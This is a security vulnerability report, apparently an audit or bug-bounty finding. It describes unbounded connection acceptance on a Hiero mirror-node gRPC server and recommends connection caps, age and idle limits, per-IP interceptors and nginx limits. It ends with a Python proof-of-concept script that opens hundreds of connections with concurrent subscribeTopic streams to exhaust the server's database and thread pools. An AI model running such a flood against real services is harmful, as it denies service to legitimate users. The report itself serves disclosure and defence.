### Title
Unbounded TCP Connection Acceptance Enables Unauthenticated Resource Exhaustion on gRPC Transaction Read Path

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures only `maxConcurrentCallsPerConnection` on the `NettyServerBuilder`, leaving the total number of accepted TCP connections completely unbounded. Because the gRPC endpoint requires no authentication, any external attacker can open an arbitrary number of connections and saturate the server's thread pool, database connection pool, and memory by multiplying connections by the per-connection stream cap.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:
```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `NettyServerBuilder` exposes `maxConnections(int)`, `maxConnectionAge(long, TimeUnit)`, `maxConnectionIdle(long, TimeUnit)`, and `keepAliveTime(long, TimeUnit)` — none of which are called. The only guard is `maxConcurrentCallsPerConnection = 5`, which is a *per-connection* limit. The total number of TCP connections accepted by the server is bounded only by the OS file descriptor limit.

**Failed assumption:** The developers assumed that capping streams per connection would bound total server load. It does not — an attacker simply opens more connections.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (no credentials required — the only production `ServerInterceptor` is a test-only `GrpcInterceptor` that only sets an endpoint context label).
2. On each connection, the attacker opens 5 concurrent `subscribeTopic` streaming RPCs (the long-lived HCS subscription endpoint).
3. Each stream causes `PollingTopicListener.listen()` or the Redis listener to continuously poll the database via `TopicMessageRepository.findByFilter()`.
4. Total active DB-polling subscriptions = N × 5, with no server-side cap on N.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` limits streams per connection, not total connections.
- No `maxConnections()` call exists anywhere in the `NettyServerBuilder` customizer.
- No authentication or authorization is enforced on the gRPC path (the production config directory contains no `ServerInterceptor` bean that rejects unauthenticated callers).
- The nginx proxy (`docker-compose.yml` line 226–228) applies only a 600 s read timeout per stream; it has no `limit_conn` or connection rate-limiting directive for the gRPC upstream.
- The web3 module has Bucket4j throttling (`ThrottleConfiguration.java`), but no equivalent exists in the grpc module.
- Prometheus alerts (`GrpcHighDBConnections`, `GrpcHighFileDescriptors`) are reactive and only alert after exhaustion; they do not prevent it.

### Impact Explanation
An attacker who opens N connections and saturates 5N streams drives the HikariCP database connection pool to exhaustion (alerting threshold is 75% utilization per the Prometheus rule), starves the `applicationTaskExecutor` thread pool, and can exhaust JVM heap through the reactive `Flux` pipelines and message buffers (`maxBufferSize = 16384` per listener). The result is a complete denial of service against the `subscribeTopic` read path — legitimate clients receive no topic messages. Because the gRPC port (5600) is publicly exposed, this affects all consumers of the HCS subscription API.

### Likelihood Explanation
No privileges, credentials, or special knowledge are required. The attack requires only network access to port 5600 and a standard gRPC client library. It is trivially scriptable: a loop opening TCP connections and issuing `subscribeTopic` RPCs is sufficient. The attack is repeatable and persistent as long as the attacker maintains open connections. The default `maxConcurrentCallsPerConnection = 5` is documented publicly in `docs/configuration.md`, so the amplification factor is known to any reader of the documentation.

### Recommendation
1. **Add a total connection cap** in `grpcServerConfigurer()`:
   ```java
   serverBuilder.maxConnections(nettyProperties.getMaxConnections()); // e.g. 1000
   ```
2. **Add connection age and idle limits** to force recycling:
   ```java
   serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.MILLISECONDS);
   serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.MILLISECONDS);
   ```
3. **Add a gRPC `ServerInterceptor`** that tracks active streams per remote IP and rejects connections exceeding a per-IP threshold.
4. **Add nginx `limit_conn`** on the gRPC upstream to enforce a per-IP TCP connection cap at the proxy layer.
5. Expose the new properties in `NettyProperties` with safe defaults and document them in `docs/configuration.md`.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stub for com.hedera.mirror.api.proto.ConsensusService
from consensus_service_pb2_grpc import ConsensusServiceStub
from consensus_service_pb2 import ConsensusTopicQuery
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 500          # N connections
STREAMS_PER_CONN = 5           # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)   # no credentials needed
    stub = ConsensusServiceStub(channel)
    query = ConsensusTopicQuery(
        topicID=...,           # any valid topic ID
        consensusStartTime=Timestamp(seconds=0)
    )
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.subscribeTopic(query))  # blocks, holds stream open
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as ex:
    list(ex.map(flood, range(NUM_CONNECTIONS)))
# Result: 2500 concurrent DB-polling subscriptions; DB pool exhausted; legitimate clients time out.
```
